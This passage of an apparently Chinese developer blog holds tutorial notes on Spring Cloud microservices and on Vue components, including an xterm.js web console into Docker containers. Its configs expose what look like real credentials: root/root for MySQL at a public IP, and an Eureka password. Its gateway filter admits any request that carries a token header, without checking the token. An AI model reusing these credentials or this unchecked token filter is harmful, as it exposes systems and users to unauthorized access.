java:8-alpine COPY ./app.jar /tmp/app.jar EXPOSE 8080 ENTRYPOINT java -jar /tmp/app.jar 项目打包 将jar包放到与dockerfile同一目录下 上传到服务器中构建镜像 进入到Dockerfile所在的目录下，运行以下命令 docker build -t fmmall . 创建容器 docker run --name fmmall -p 8080:8080 -d fmmall 分布式使用watch dog机制监视redis中key的过期时间 看门狗线程：用于给当前的key延长过期时间，保证业务线程正常执行过程，锁不会过期 分布式锁框架-redisson 基于redis+看门狗实现的分布式锁框架 ESspringboot整合ES 导入依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt; &lt;/dependency&gt; 配置信息 spring: elasticsearch: rest: uris: http://192.168.238.132:9200 将数据库中的信息导入到ES中 如果商品表中没有数据，则在平台管理系统中的商品添加功能中，当商家向商品表添加并上架一个商品时同步向ES添加一个商品;商家下架一个商品就从ES中删除一个商品。系统运行前期数据量小没有使用ES，当数据量增长之后使用ES时，需要将数据库现有的数据导入到ES(导入工作需要在项目部署到生产环境之前来完成) // 1.查询数据库获取到所有数据 List&lt;ProductVO&gt; productVOS = productMapper.selectProducts(); int size = productVOS.size(); // return ResultVO.success(size); // 2. 遍历数据将数据写入到ES中 this.client =new RestHighLevelClient(RestClient.builder( HttpHost.create(&quot;http://192.168.238.132:9200&quot;) )); for (int i = 0; i &lt; productVOS.size(); i++) &#123; ProductVO productVO = productVOS.get(i); String productId = productVO.getProductId(); String productName = productVO.getProductName(); Integer soldNum = productVO.getSoldNum(); List&lt;ProductSku&gt; skus = productVO.getSkus(); String skuImg = skus.size() == 0? &quot;&quot;: productVO.getSkus().get(0).getSkuImg(); String skuName = skus.size() == 0? &quot;&quot;: productVO.getSkus().get(0).getSkuName(); Integer sellPrice = skus.size() == 0? 0: productVO.getSkus().get(0).getSellPrice(); Product4ES product4ES = new Product4ES(productId, productName, skuImg, soldNum, skuName, sellPrice); IndexRequest request = new IndexRequest(&quot;fmmallproductindex&quot;); request.id(productId).source(JSON.toJSONString(product4ES), XContentType.JSON); IndexResponse index = this.client.index(request, RequestOptions.DEFAULT); System.out.println(&quot;------ i &quot; + i + &quot;-----&quot; + index); &#125; this.client.close(); 使用ES进行进行全文搜索 /*从ES中查询信息*/ this.client =new RestHighLevelClient(RestClient.builder( HttpHost.create(&quot;http://192.168.238.132:9200&quot;) )); int start = (pageNum-1)*limit; SearchRequest request = new SearchRequest(&quot;fmmallproductindex&quot;); SearchSourceBuilder sourceBuilder = new SearchSourceBuilder(); sourceBuilder.query(QueryBuilders.multiMatchQuery(kw, &quot;productName&quot;, &quot;pruductSkuName&quot;)); // 分页条件 sourceBuilder.from(start); sourceBuilder.size(limit); // 高亮显示 HighlightBuilder highlightBuilder = new HighlightBuilder(); HighlightBuilder.Field productName = new HighlightBuilder.Field(&quot;productName&quot;); HighlightBuilder.Field pruductSkuName = new HighlightBuilder.Field(&quot;pruductSkuName&quot;); highlightBuilder.field(productName); highlightBuilder.field(pruductSkuName); highlightBuilder.preTags(&quot;&lt;label style=&#x27;color:red&#x27;&gt;&quot;); highlightBuilder.postTags(&quot;&lt;label&gt;&quot;); sourceBuilder.highlighter(highlightBuilder); request.source(sourceBuilder); SearchResponse searchResponse = null; try &#123; searchResponse = this.client.search(request, RequestOptions.DEFAULT); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; // 处理响应结果 SearchHits hits = searchResponse.getHits(); TotalHits totalHits = hits.getTotalHits(); int count = (int) totalHits.value; // 查询到的记录总数 int pageCount = (count%limit==0? count/limit:count/limit+1); Iterator&lt;SearchHit&gt; iterator = hits.iterator(); List&lt;Product4ES&gt; product4ESList = new ArrayList&lt;&gt;(); while(iterator.hasNext())&#123; SearchHit nextHit = iterator.next(); String sourceAsString = nextHit.getSourceAsString(); Product4ES product4ES = JSON.parseObject(sourceAsString, Product4ES.class); // 获取高亮字段 Map&lt;String, HighlightField&gt; highlightFields = nextHit.getHighlightFields(); HighlightField highLightProductName = highlightFields.get(&quot;productName&quot;); if(highLightProductName != null)&#123; String string = Arrays.toString(highLightProductName.fragments()); product4ES.setProductName(string); &#125; product4ESList.add(product4ES); &#125; PageHelper&lt;Product4ES&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, product4ESList); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;SUCCESS&quot;, pageHelper); return resultVO; 搭建服务发现和注册中心Eureka 添加关于erueka相关配置信息 eureka: client: service-url: defaultZone: http://127.0.0.1:8761/eureka register-with-eureka: false fetch-registry: false server: port: 8761 spring: application: name: eureka-server 在项目的启动类中添加注释@EnableEurekaServer package com.qfedu.eureka.server; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer; @SpringBootApplication @EnableEurekaServer public class EurekaServerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaServerApplication.class, args); &#125; &#125; 配置security信息 spring: application: name: eureka-server security: user: name: sunzy password: 111111 配置springsecuity ``` ### 拆分用户登录模块 - 首先创建新的模块 api-user-login - 导入依赖 ```xml &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 配置application.yml server: port: 8001 eureka: client: service-url: defualtZone: http://sunzy:111111@127.0.0.1:8761/eureka spring: application: name: api-user-login 在启动类添加注解@EnableDiscoveryClient和@EnableFeignClients package com.qfedu.api; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; @SpringBootApplication @EnableDiscoveryClient @EnableFeignClients public class ApiUserLoginApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(ApiUserLoginApplication.class, args); &#125; &#125; 添加注解后既可启动服务，在注册中心中可以看到注册成功的服务 用户查询模块 该模块的主要的作用是为登录提供用户查询功能，因此涉及到服务调用 首先创建模块user-check pom文件内容 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;user-check&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;name&gt;user-check&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; application.yaml server: port: 9001 spring: application: name: user-check datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://81.68.252.36:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false username: root password: root mybatis-plus: global-config: db-config: # table-prefix: tbl_ id-type: auto configuration: # 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka 在启动类中添加注释@EnableDiscoveryClient service和dao层代码与之前写内容基本一致 在api-user-login模块中调用user-check 创建UserCheckClient @FeignClient(value = &quot;user-check&quot;) public interface UserCheckClient &#123; @GetMapping(&quot;user/check&quot;) public Users userCheck(@RequestParam(&quot;username&quot;) String username,@RequestParam(&quot;password&quot;) String password); &#125; 其中@FeignClient(value = &quot;user-check&quot;)中的value要与注册到eureka中服务名相同，@GetMapping(&quot;user/check&quot;)要与user-check的controller中的访问路径相同。 方法名也要与controller中的方法相同。并且在有多个参数的情况下需要在每个参数前加上@RequestParam(&quot;username&quot;)，否则fegin调用时，会将所有的参数当成post方式的请求体，从而报错。 public Users userCheck(@RequestParam(&quot;username&quot;) String username,@RequestParam(&quot;password&quot;) String password); api-user-login在service中进行服务调用即可 package com.qfedu.api.service.impl; import com.qfedu.api.service.UserService; import com.qfedu.api.service.fegin.UserCheckClient; import com.qfedu.fmmall.beans.Users; import com.qfedu.fmmall.vo.ResultVO; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; import org.springframework.stereotype.Service; @Service public class UserServiceImpl implements UserService &#123; @Qualifier(&quot;com.qfedu.api.service.fegin.UserCheckClient&quot;) @Autowired private UserCheckClient userCheckClient; @Override public ResultVO checkLogin(String username, String password) &#123; // 调用另外一个服务从数据库中查询到用户信息 Users users = userCheckClient.userCheck(username, password); if(users == null) &#123; return ResultVO.failed(&quot;密码错误！&quot;); &#125;else if (&quot;null&quot;.equals(users.getNickname()))&#123; return ResultVO.failed(&quot;用户名不存在！&quot;); &#125;else &#123; return ResultVO.success(users); &#125; &#125; &#125; 搭建gateway 创建gateway服务模块 pom文件内容 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;gateway&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;name&gt;gateway&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.projectreactor&lt;/groupId&gt; &lt;artifactId&gt;reactor-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 在application.yml中配置相关信息 server: port: 8000 spring: application: name: gateway cloud: gateway: routes: - id: api-service uri: http://127.0.0.1:8001 predicates: - Path=/user/login - id: api-service uri: http://127.0.0.1:8002 predicates: - Path=/user/regist 实现全局过滤器 当用户访问8000端口时，所有的请求都会被该过滤器拦截 因此全局过滤器可以进行权限验证 package com.qfedu.gateway.filter; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.core.Ordered; import org.springframework.http.HttpStatus; import org.springframework.stereotype.Component; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; import java.util.List; @Component public class MyGlobalFilter implements GlobalFilter, Ordered &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123; System.out.println(&quot;-------------------&quot;); System.out.println(&quot;进入全局过滤器&quot;); List&lt;String&gt; token = exchange.getRequest().getHeaders().get(&quot;token&quot;); if(token != null &amp;&amp; token.size() &gt; 0)&#123; // 对token进行验证，如果验证通过则放行本次拦截 return chain.filter(exchange); &#125;else &#123; // 验证不通过，则返回对应的状态码 exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); // 拦截请求 return exchange.getResponse().setComplete(); &#125; &#125; @Override public int getOrder() &#123; return 0; &#125; &#125; 动态路由配置 使用服务注册与发现实现动态路由 将gateway服务模块加入到eureka中，即添加依赖添加配置文件 eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka 使用注册到eureka中的服务名替换ip地址 lb代表使用负载均衡模式，默认策略时轮询 server: port: 8000 spring: application: name: gateway main: web-application-type: reactive cloud: gateway: routes: - id: api-login uri: lb://api-user-login #uri: http://127.0.0.1:8001 predicates: - Path=/user/login - id: api-regist uri: lb://api-user-regist predicates: - Path=/user/regist eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka Gateway限流 基于令牌桶实现的网关限流，使用redis作为桶结合过滤器实现限流 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; 配置application.yml server: port: 8000 spring: application: name: gateway main: web-application-type: reactive cloud: gateway: routes: - id: api-login uri: http://127.0.0.1:8001 # uri: lb://api-user-login predicates: - Path=/user/login #限流策略配置 filters: - name: RequestRateLimiter args: redis-rate-limiter.replenishRate: 1 #令牌桶每s的填充速度 redis-rate-limiter.burstCapacity: 2 # 令牌桶容量 redis-rate-limiter.requestedTokens: 1 key-resolver: &quot;#&#123;@keyResolver&#125;&quot; - id: api-regist uri: lb://api-user-regist predicates: - Path=/user/regist redis: host: 127.0.0.1 port: 6379 database: 0 password: # lettuce: # pool: # max-active: 10 # max-wait: 1000 # max-idle: 5 # min-idle: 3 eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka 配置keyResolver package com.qfedu.gateway.config; import org.springframework.cloud.gateway.filter.ratelimit.KeyResolver; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import reactor.core.publisher.Mono; @Configuration public class AppConfig &#123; @Bean public KeyResolver keyResolver() &#123; //http://localhost:9999/order/query?user=1 //使⽤请求中的user参数的值作为令牌桶的key //return exchange -&gt;Mono.just(exchange.getRequest().getQueryParams().getFirst(&quot;user&quot;)); return exchange -&gt; Mono.just(exchange.getRequest().getURI().getPath()); &#125; &#125; 当用户访问的速度超过了令牌的产生速度时就会无法访问，返回429的状态码","tags":[]},{"title":"vue_component","date":"2022-05-26T07:03:25.000Z","path":"2022/05/26/vue-component/","text":"Vue组件做项目中使用到的vue组件，记录一下，以后使用到时直接复制即可 Element UI进入项目目录，安装依赖npm install element-ui -S 安装成功后，查看配置文件package.json，是否有element-ui组件的版本号 如下图： 在main.js文件中 引入 element 组件import ElementUI from &#x27;element-ui&#x27;; import &#x27;element-ui/lib/theme-chalk/index.css&#x27;; Vue.use(ElementUI, &#123; size: &quot;mini&quot; &#125;); 完成以上两个步骤，即可在项目中使用element-ui提供的组件了 Echarts安装依赖npm install echarts -S 如果不加版本号则默认安装最新版 npm install echarts@5.3.2 -S 添加版本号，可以安装指定版本的依赖包，如图所示。 在vue文件中使用Echarts 创建dom组件&lt;div id=&quot;pie&quot; style=&quot;width: 500px; height: 400px&quot;&gt;&lt;/div&gt; 初始化图表数据var pieOption = &#123; title: &#123; text: &#x27;各季度会员数量统计&#x27;, subtext: &#x27;比例图&#x27;, left: &#x27;center&#x27; &#125;, tooltip: &#123; trigger: &#x27;item&#x27; &#125;, legend: &#123; orient: &#x27;vertical&#x27;, left: &#x27;left&#x27; &#125;, series: [ &#123; type: &#x27;pie&#x27;, radius: &#x27;60%&#x27;, label:&#123; //饼图图形上的文本标签 normal:&#123; show:true, position:&#x27;inner&#x27;, //标签的位置 textStyle : &#123; fontWeight : 300 , fontSize : 14, //文字的字体大小 color: &quot;#fff&quot; &#125;, formatter:&#x27;&#123;d&#125;%&#x27; &#125; &#125;, data: [], // 填空 emphasis: &#123; itemStyle: &#123; shadowBlur: 10, shadowOffsetX: 0, shadowColor: &#x27;rgba(0, 0, 0, 0.5)&#x27; &#125; &#125; &#125; ] &#125;; var pieDom = document.getElementById(&#x27;pie&#x27;); var pieChart = echarts.init(pieDom); 其中data: [],是表格显示的数据，这里是需要重点实现的 这里可以在前端页面中写死数据，但是大多需要请求后端接口获取数据，如下 this.request.get(&quot;/echarts/members&quot;).then(res =&gt;&#123; pieOption.series[0].data = [ &#123;name: &quot;第一季度&quot;, value: res.data[0]&#125;, &#123;name: &quot;第二季度&quot;, value: res.data[1]&#125;, &#123;name: &quot;第三季度&quot;, value: res.data[2]&#125;, &#123;name: &quot;第四季度&quot;, value: res.data[3]&#125;, ] pieChart.setOption(pieOption); &#125; 实现效果图 Xterm毕业设计中实现了在网页中进入容器内容，也就是docker exec -it containerId bash功能 与webSHH功能类似 安装依赖npm install xterm -S 安装使用到的插件 npm install xterm-addon-attach -S npm install xterm-addon-fit -S 本文使用的版本如下 在页面中导入使用到的包import &quot;xterm/css/xterm.css&quot;; import &#123; Terminal &#125; from &quot;xterm&quot;; import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;; import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;; 前端所有代码如下 &lt;template&gt; &lt;div class&#x3D;&quot;app-container&quot;&gt; &lt;el-row &gt; &lt;h1&gt;Web Console&lt;&#x2F;h1&gt; &lt;div id&#x3D;&quot;log&quot; style&#x3D;&quot;margin-top:20px;&quot;&gt; &lt;div class&#x3D;&quot;xterm&quot; id&#x3D;&quot;terminal&quot;&gt;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;el-row&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &quot;xterm&#x2F;css&#x2F;xterm.css&quot;; import &#123; Terminal &#125; from &quot;xterm&quot;; import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;; import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;; export default &#123; components: &#123;&#125;, props: &#123; socketURI: &#123; type: String, default: &quot;&quot; &#125; &#125;, data() &#123; return &#123; term: null, socket: null, rows: 40, &#x2F;&#x2F; cols: 10, webSocketUrl: &#39;&#39;, &#x2F;&#x2F;&quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;5e0647ee611b&quot;, SetOut: false, isKey: false &#125; &#125;, computed: &#123;&#125;, watch: &#123;&#125;, created() &#123; const id &#x3D; this.$route.query.id console.log(id) this.webSocketUrl &#x3D; &quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;&quot; + id &#125;, mounted() &#123; this.initSocket(); &#125;, beforeDestroy() &#123; this.socket.close(); &#x2F;&#x2F; this.term.dispose(); &#125;, methods: &#123; submitForm() &#123; this.$refs[&#39;elForm&#39;].validate(valid &#x3D;&gt; &#123; if (!valid) return &#x2F;&#x2F; TODO 提交表单 &#125;) &#125;, resetForm() &#123; this.$refs[&#39;elForm&#39;].resetFields() &#125;, &#x2F;&#x2F;Xterm主题 initTerm(data, callback) &#123; const term &#x3D; new Terminal(&#123; rendererType: &quot;canvas&quot;, &#x2F;&#x2F;渲染类型 rows: this.rows, &#x2F;&#x2F;行数 &#x2F;&#x2F; cols: this.cols,&#x2F;&#x2F; 设置之后会输入多行之后覆盖现象 convertEol: true, &#x2F;&#x2F;启用时，光标将设置为下一行的开头 &#x2F;&#x2F; scrollback: 10,&#x2F;&#x2F;终端中的回滚量 fontSize: 14, &#x2F;&#x2F;字体大小 disableStdin: false, &#x2F;&#x2F;是否应禁用输入。 cursorStyle: &quot;block&quot;, &#x2F;&#x2F;光标样式 cursorBlink: true, &#x2F;&#x2F;光标闪烁 scrollback: 30, tabStopWidth: 8, theme: &#123; foreground: &quot;green&quot;, &#x2F;&#x2F;字体 background: &quot;#000000&quot;, &#x2F;&#x2F;背景色 cursor: &quot;help&quot; &#x2F;&#x2F;设置光标 &#125; &#125;); const attachAddon &#x3D; new AttachAddon(this.socket); const fitAddon &#x3D; new FitAddon(); term.loadAddon(attachAddon); term.loadAddon(fitAddon); term.open(document.getElementById(&quot;terminal&quot;)); fitAddon.fit(); term.focus(); let _this &#x3D; this; &#x2F;&#x2F;限制和后端交互，只有输入回车键才显示结果 term.prompt &#x3D; () &#x3D;&gt; &#123; term.write(&quot;\\r\\n$ &quot;); &#125;; term.prompt(); function runFakeTerminal(_this) &#123; if (term._initialized) &#123; return; &#125; &#x2F;&#x2F; 初始化 term._initialized &#x3D; true; term.writeln();&#x2F;&#x2F;控制台初始化报错处 term.prompt(); &#x2F;&#x2F; &#x2F; ** &#x2F;&#x2F; *添加事件监听器，用于按下键时的事件。事件值包含 &#x2F;&#x2F; *将在data事件以及DOM事件中发送的字符串 &#x2F;&#x2F; *触发了它。 &#x2F;&#x2F; * @返回一个IDisposable停止监听。 &#x2F;&#x2F; * &#x2F; &#x2F;&#x2F; &#x2F; ** 更新：xterm 4.x（新增） &#x2F;&#x2F; *为数据事件触发时添加事件侦听器。发生这种情况 &#x2F;&#x2F; *用户输入或粘贴到终端时的示例。事件值 &#x2F;&#x2F; *是&#96;string&#96;结果的结果，在典型的设置中，应该通过 &#x2F;&#x2F; *到支持pty。 &#x2F;&#x2F; * @返回一个IDisposable停止监听。 &#x2F;&#x2F; * &#x2F; &#x2F;&#x2F; 支持输入与粘贴方法 term.onData(function(key) &#123; let order &#x3D; &#123; Data: key, Op: &quot;stdin&quot; &#125;; _this.onSend(order); &#125;); _this.term &#x3D; term; &#125; runFakeTerminal(_this); &#125;, &#x2F;&#x2F;webShell主题 initSocket() &#123; const WebSocketUrl &#x3D; this.webSocketUrl this.socket &#x3D; new WebSocket( WebSocketUrl ); this.socketOnClose(); &#x2F;&#x2F;关闭 this.socketOnOpen(); &#x2F;&#x2F; this.socketOnError(); &#125;, &#x2F;&#x2F;webshell链接成功之后操作 socketOnOpen() &#123; this.socket.onopen &#x3D; () &#x3D;&gt; &#123; &#x2F;&#x2F; 链接成功后 this.initTerm(); &#125;; &#125;, &#x2F;&#x2F;webshell关闭之后操作 socketOnClose() &#123; this.socket.onclose &#x3D; () &#x3D;&gt; &#123; console.log(&quot;close socket&quot;); &#125;; &#125;, &#x2F;&#x2F;webshell错误信息 socketOnError() &#123; this.socket.onerror &#x3D; () &#x3D;&gt; &#123; console.log(&quot;socket 链接失败&quot;); &#125;; &#125;, &#x2F;&#x2F;特殊处理 onSend(data) &#123; data &#x3D; this.base.isObject(data) ? JSON.stringify(data) : data; data &#x3D; this.base.isArray(data) ? data.toString() : data; data &#x3D; data.replace(&#x2F;\\\\\\\\&#x2F;, &quot;\\\\&quot;); this.shellWs.onSend(data); &#125;, &#x2F;&#x2F;删除左右两端的空格 trim(str) &#123; return str.replace(&#x2F;(^\\s*)|(\\s*$)&#x2F;g, &quot;&quot;); &#125; &#125; &#125; &lt;&#x2F;script&gt; &lt;style&gt; &lt;&#x2F;style&gt; 以前前端代码基本不需要改动，只需要修改后端的api this.webSocketUrl = &quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=&quot; + id 将该参数修改为后端websocket接口即可使用 vue-video-player安装依赖npm install vue-video-player@5.0.2 -S 在单文件中使用首先导入依赖 import &#123; videoPlayer &#125; from &#x27;vue-video-player/src&#x27; import &#x27;video.js/dist/video-js.css&#x27; import &#x27;vue-video-player/src/custom-theme.css&#x27; export default &#123; name: &quot;VideoDetail&quot;, components: &#123; videoPlayer &#125;, 之前是import &#123; videoPlayer &#125; from &#39;vue-video-player&#39; ，报错信息如下 error in ./node_modules/vue-video-player/dist/vue-video-player.js Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\\Sunzh\\java\\admin_demo\\hello-world\\node_modules\\vue-video-player\\dist&#x27; ERROR in ./node_modules/vue-video-player/dist/vue-video-player.js Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\\Sunzh\\java\\admin_demo\\hello-world\\node_modules\\vue-video-player\\dist&#x27; @ ./node_modules/babel-loader/lib/index.js??clonedRuleSet-40[0].rules[0].use[0]!./node_modules/@vue/vue-loader-v15/lib/index.js??vue-loader-options!./src/views/Detail.vue?vue&amp;type=scr ipt&amp;lang=js&amp; 13:0-47 19:17-28 @ ./src/views/Detail.vue?vue&amp;type=script&amp;lang=js&amp; 1:0-212 1:228-231 1:233-442 1:233-442 @ ./src/views/Detail.vue 2:0-58 3:0-53 3:0-53 9:2-8 @ ./src/router/index.js 82:11-40 @ ./src/main.js 7:0-30 26:10-16 完整的前端代码 &lt;template&gt; &lt;div&gt; &lt;div class&#x3D;&#39;demo&#39;&gt; &lt;video-player class&#x3D;&quot;video-player-box&quot; ref&#x3D;&quot;videoPlayer&quot; :playsinline&#x3D;&quot;true&quot; :options&#x3D;&quot;playerOptions&quot;&gt; &lt;&#x2F;video-player&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; videoPlayer &#125; from &#39;vue-video-player&#x2F;src&#39; import &#39;video.js&#x2F;dist&#x2F;video-js.css&#39; import &#39;vue-video-player&#x2F;src&#x2F;custom-theme.css&#39; export default &#123; name: &quot;VideoDetail&quot;, components: &#123; videoPlayer &#125;, data() 